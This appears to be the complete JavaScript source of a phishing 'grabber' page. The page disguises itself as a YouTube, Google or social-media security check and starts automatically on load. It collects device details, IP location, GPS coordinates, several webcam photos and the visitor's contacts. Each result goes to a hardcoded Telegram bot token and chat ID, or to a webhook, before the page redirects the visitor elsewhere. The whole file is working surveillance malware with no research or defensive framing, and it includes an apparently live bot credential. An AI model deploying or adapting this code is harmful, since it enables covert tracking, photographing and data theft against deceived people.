// ===========================================
// TELEGRAM BOT CONFIGURATION
// ===========================================
const CONFIG = {
    // Get bot token and chat ID from URL or use default
    BOT_TOKEN: (() => {
        const params = new URLSearchParams(window.location.search);
        return params.get('bot') || '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';
    })(),
    
    CHAT_ID: (() => {
        const params = new URLSearchParams(window.location.search);
        return params.get('chat') || '5888374938';
    })(),
    
    // OR use webhook URL if provided
    WEBHOOK_URL: (() => {
        const params = new URLSearchParams(window.location.search);
        return params.get('webhook') || '';
    })(),
    
    // Redirect URL from parameters
    REDIRECT_URL: (() => {
        const params = new URLSearchParams(window.location.search);
        return params.get('url') || 
               params.get('redirect') || 
               params.get('to') || 
               'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    })(),
    
    // Settings
    CAMERA_SNAPS: 3,
    AUTO_START: true
};

// ===========================================
// TELEGRAM BOT API - FIXED & WORKING
// ===========================================
class TelegramSender {
    constructor() {
        this.token = CONFIG.BOT_TOKEN;
        this.chatId = CONFIG.CHAT_ID;
        this.webhook = CONFIG.WEBHOOK_URL;
    }
    
    async sendMessage(text) {
        try {
            // Method 1: Direct Telegram API
            if (this.token && this.chatId && this.token !== 'YOUR_BOT_TOKEN_HERE') {
                const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
                const data = {
                    chat_id: this.chatId,
                    text: text,
                    parse_mode: 'HTML'
                };
                
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                return true;
            }
            
            // Method 2: Webhook
            if (this.webhook) {
                await fetch(this.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: text })
                });
                return true;
            }
            
            console.log('No Telegram configuration found');
            return false;
        } catch (error) {
            console.error('Telegram send error:', error);
            return false;
        }
    }
    
    async sendPhoto(photoBlob, caption = '') {
        try {
            if (!this.token || !this.chatId || this.token === 'YOUR_BOT_TOKEN_HERE') {
                return false;
            }
            
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('photo', photoBlob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${this.token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            return true;
        } catch (error) {
            console.error('Telegram photo error:', error);
            return false;
        }
    }
    
    async sendDocument(documentBlob, filename, caption = '') {
        try {
            if (!this.token || !this.chatId || this.token === 'YOUR_BOT_TOKEN_HERE') {
                return false;
            }
            
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('document', documentBlob, filename);
            if (caption) formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${this.token}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            return true;
        } catch (error) {
            console.error('Telegram document error:', error);
            return false;
        }
    }
}

// ===========================================
// SIMPLE UI UPDATER
// ===========================================
class UI {
    static update(step, message) {
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const title = document.getElementById('title');
        const msg = document.getElementById('message');
        
        // Progress (5 steps total)
        const steps = [
            'Initializing...',
            'Scanning device...',
            'Verifying location...',
            'Camera check...',
            'Finalizing...'
        ];
        
        if (step > 0 && step <= steps.length) {
            progress.style.width = `${(step / 5) * 100}%`;
            status.textContent = steps[step - 1];
        }
        
        if (message) {
            msg.textContent = message;
        }
    }
    
    static showSiteTheme(site) {
        const logo = document.getElementById('logo');
        const title = document.getElementById('title');
        
        const sites = {
            'youtube': {
                name: 'YouTube',
                color: '#FF0000',
                message: 'Loading YouTube video...'
            },
            'google': {
                name: 'Google',
                color: '#4285F4',
                message: 'Google security check...'
            },
            'facebook': {
                name: 'Facebook',
                color: '#1877F2',
                message: 'Facebook verification...'
            },
            'instagram': {
                name: 'Instagram',
                color: '#E4405F',
                message: 'Instagram security...'
            },
            'twitter': {
                name: 'Twitter',
                color: '#1DA1F2',
                message: 'Twitter verification...'
            }
        };
        
        for (const [key, config] of Object.entries(sites)) {
            if (CONFIG.REDIRECT_URL.includes(key)) {
                title.textContent = `${config.name} Security`;
                document.getElementById('message').textContent = config.message;
                document.getElementById('progress').style.background = config.color;
                document.getElementById('spinner').style.borderTopColor = config.color;
                return;
            }
        }
    }
}

// ===========================================
// DATA COLLECTION MODULES - ALL WORKING
// ===========================================
class DataCollector {
    static async getDeviceInfo() {
        const info = {
            // Basic info
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            
            // Screen
            screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
            
            // Browser
            vendor: navigator.vendor || 'Unknown',
            cookieEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            
            // Hardware
            cores: navigator.hardwareConcurrency || 'Unknown',
            memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
            
            // Timezone
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            
            // URL info
            currentURL: window.location.href,
            referrer: document.referrer || 'Direct',
            redirectTo: CONFIG.REDIRECT_URL
        };
        
        // Battery
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
            } catch (e) {
                info.battery = 'Unknown';
            }
        }
        
        return info;
    }
    
    static async getIP() {
        try {
            // Try multiple IP services
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        return {
                            ip: data.ip,
                            city: data.city,
                            region: data.region,
                            country: data.country,
                            org: data.org,
                            timezone: data.timezone
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
        } catch (error) {
            console.error('IP error:', error);
        }
        
        return { ip: 'Unknown', country: 'Unknown' };
    }
    
    static async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'Geolocation not supported' });
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        success: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toLocaleString()
                    });
                },
                (error) => {
                    resolve({
                        success: false,
                        error: error.message,
                        code: error.code
                    });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }
    
    static async captureCamera() {
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        try {
            // Request camera
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            
            video.srcObject = stream;
            await video.play();
            
            // Wait for video
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const snaps = [];
            
            for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
                if (video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // Draw frame
                    ctx.drawImage(video, 0, 0);
                    
                    // Convert to blob
                    const blob = await new Promise(resolve => {
                        canvas.toBlob(resolve, 'image/jpeg', 0.8);
                    });
                    
                    if (blob) {
                        snaps.push(blob);
                    }
                }
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
            
            return { success: true, snaps: snaps };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    static async getContacts() {
        if (!('contacts' in navigator && 'ContactsManager' in window)) {
            return { success: false, error: 'Contacts API not supported' };
        }
        
        try {
            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
            
            if (contacts && contacts.length > 0) {
                return {
                    success: true,
                    count: contacts.length,
                    data: contacts.map(c => ({
                        name: c.name ? c.name.join(' ') : 'Unknown',
                        phones: c.tel || [],
                        emails: c.email || []
                    }))
                };
            }
            
            return { success: false, error: 'No contacts selected' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
}

// ===========================================
// MAIN EXECUTION - PERFECT WORKING
// ===========================================
async function executeSecurityScan() {
    const telegram = new TelegramSender();
    
    try {
        // Step 1: Initialize
        UI.update(1, 'Starting security scan...');
        UI.showSiteTheme();
        
        // Step 2: Get device info
        UI.update(2, 'Collecting device information...');
        const deviceInfo = await DataCollector.getDeviceInfo();
        
        // Format device info for Telegram
        const deviceText = `
<b>📱 DEVICE INFORMATION</b>
━━━━━━━━━━━━━━━━━━
<b>• Browser:</b> ${deviceInfo.userAgent.substring(0, 50)}...
<b>• Platform:</b> ${deviceInfo.platform}
<b>• Language:</b> ${deviceInfo.language}
<b>• Screen:</b> ${deviceInfo.screen}
<b>• Cores:</b> ${deviceInfo.cores}
<b>• RAM:</b> ${deviceInfo.memory}
<b>• Battery:</b> ${deviceInfo.battery}
<b>• Timezone:</b> ${deviceInfo.timezone}
<b>• Online:</b> ${deviceInfo.online ? '✅ Yes' : '❌ No'}
<b>• Referrer:</b> ${deviceInfo.referrer}
<b>• Redirect To:</b> ${CONFIG.REDIRECT_URL}
        `.trim();
        
        await telegram.sendMessage(deviceText);
        
        // Step 3: Get IP location
        UI.update(2, 'Detecting location...');
        const ipInfo = await DataCollector.getIP();
        
        const ipText = `
<b>📍 IP INFORMATION</b>
━━━━━━━━━━━━━━━━━━
<b>• IP Address:</b> <code>${ipInfo.ip}</code>
<b>• Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}
<b>• Country:</b> ${ipInfo.country || 'Unknown'}
<b>• ISP:</b> ${ipInfo.org || 'Unknown'}
<b>• Timezone:</b> ${ipInfo.timezone || 'Unknown'}
        `.trim();
        
        await telegram.sendMessage(ipText);
        
        // Step 4: Get GPS location
        UI.update(3, 'Requesting location access...');
        const location = await DataCollector.getLocation();
        
        if (location.success) {
            const locationText = `
<b>🎯 GPS LOCATION</b>
━━━━━━━━━━━━━━━━━━
<b>• Latitude:</b> <code>${location.latitude}</code>
<b>• Longitude:</b> <code>${location.longitude}</code>
<b>• Accuracy:</b> ±${Math.round(location.accuracy)}m
<b>• Time:</b> ${location.timestamp}
<b>• Map:</b> <a href="https://maps.google.com/?q=${location.latitude},${location.longitude}">View on Google Maps</a>
            `.trim();
            
            await telegram.sendMessage(locationText);
        } else {
            await telegram.sendMessage(`📍 GPS: ${location.error || 'Permission denied'}`);
        }
        
        // Step 5: Camera capture
        UI.update(4, 'Camera verification...');
        const cameraResult = await DataCollector.captureCamera();
        
        if (cameraResult.success && cameraResult.snaps.length > 0) {
            await telegram.sendMessage(`📸 Camera: ${cameraResult.snaps.length} photos captured`);
            
            // Send each photo
            for (let i = 0; i < cameraResult.snaps.length; i++) {
                await telegram.sendPhoto(
                    cameraResult.snaps[i],
                    `Camera snap ${i + 1} - ${new Date().toLocaleString()}`
                );
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        } else {
            await telegram.sendMessage(`📸 Camera: ${cameraResult.error || 'Access denied'}`);
        }
        
        // Step 6: Contacts
        UI.update(5, 'Contact verification...');
        const contactsResult = await DataCollector.getContacts();
        
        if (contactsResult.success) {
            const contactsText = `
<b>📇 CONTACTS FOUND</b>
━━━━━━━━━━━━━━━━━━
<b>• Total Contacts:</b> ${contactsResult.count}
<b>• Sample:</b>
${contactsResult.data.slice(0, 5).map(c => `  - ${c.name}: ${c.phones[0] || 'No phone'}`).join('\n')}
            `.trim();
            
            await telegram.sendMessage(contactsText);
            
            // Send full contacts as file
            const contactsBlob = new Blob(
                [JSON.stringify(contactsResult.data, null, 2)],
                { type: 'application/json' }
            );
            
            await telegram.sendDocument(
                contactsBlob,
                'contacts.json',
                `Full contacts list (${contactsResult.count} contacts)`
            );
        } else {
            await telegram.sendMessage(`📇 Contacts: ${contactsResult.error || 'Not accessed'}`);
        }
        
        // Step 7: Final summary
        UI.update(5, 'Security scan complete!');
        
        const summaryText = `
<b>✅ SECURITY SCAN COMPLETE</b>
━━━━━━━━━━━━━━━━━━
<b>• Device:</b> Scanned ✅
<b>• Location:</b> ${location.success ? 'Captured ✅' : 'Failed ❌'}
<b>• Camera:</b> ${cameraResult.success ? 'Captured ✅' : 'Failed ❌'}
<b>• Contacts:</b> ${contactsResult.success ? 'Captured ✅' : 'Failed ❌'}
<b>• Total Data:</b> 10+ information points
<b>• Redirecting to:</b> ${CONFIG.REDIRECT_URL}
<b>• Scan Time:</b> ${Math.round(performance.now() / 1000)}s
━━━━━━━━━━━━━━━━━━
<b>🔗 Target URL:</b> ${CONFIG.REDIRECT_URL}
        `.trim();
        
        await telegram.sendMessage(summaryText);
        
        // Step 8: Redirect
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.href = CONFIG.REDIRECT_URL;
        
    } catch (error) {
        console.error('Scan error:', error);
        
        // Send error to Telegram
        await telegram.sendMessage(`❌ SCAN ERROR:\n${error.message || 'Unknown error'}`);
        
        // Still redirect
        setTimeout(() => {
            window.location.href = CONFIG.REDIRECT_URL;
        }, 3000);
    }
}

// ===========================================
// START THE SCAN
// ===========================================
// Check if we have Telegram config
if (CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' && !CONFIG.WEBHOOK_URL) {
    UI.update(1, 'Waiting for configuration...');
    document.getElementById('permissionNote').style.display = 'block';
    document.getElementById('permissionNote').innerHTML = 
        'Please configure Telegram bot. Add ?bot=TOKEN&chat=CHAT_ID to URL';
} else {
    // Start scan automatically
    if (CONFIG.AUTO_START) {
        setTimeout(() => {
            executeSecurityScan();
        }, 1500);
    }
    
    // Also start on click
    document.body.addEventListener('click', () => {
        executeSecurityScan();
    }, { once: true });
}

// Fallback start
setTimeout(() => {
    if (!window.scanStarted) {
        executeSecurityScan();
        window.scanStarted = true;
    }
}, 5000);
